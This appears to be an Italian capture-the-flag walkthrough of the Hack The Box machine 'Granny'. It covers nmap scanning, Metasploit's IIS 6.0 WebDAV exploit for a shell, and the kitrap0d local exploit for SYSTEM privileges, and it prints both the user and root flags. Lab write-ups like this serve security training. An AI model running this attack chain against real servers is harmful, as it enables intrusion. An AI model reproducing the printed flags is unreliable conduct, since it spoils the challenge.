![](granny.png)
# Granny -Hack The Box Writeup
## scansione nmap
```bash
nmap -sCV -O iptarget
```
Notiamo che microsoft iis 6.0 e' vulnerabile
## Msfconsole
```bash
exploit(windows/iis/iis_webdav_scstoragepathfromurl
```
ottenuta la shell
migriamo su questo processo
```bash
migrate 2728  (davcdata.exe) 
cd C:\Documents and Settings\Lakis\Desktop
type user.txt
```
# Flag user
## 700c5dc163014e22b3e408f8703f67d1
# Privilege escalation
```bash
eseguiamo /local_exploit/suggester
```
```bash
eseguiamo exploit/windows/local/ms10_015_kitrap0d
getuid
Server username: NT AUTHORITY\SYSTEM
cd C:\Documents and Settings\Administrator\Desktop
type root.txt
```
# Flag root
## aa4beed1c0584445ab463a6747bd06e9
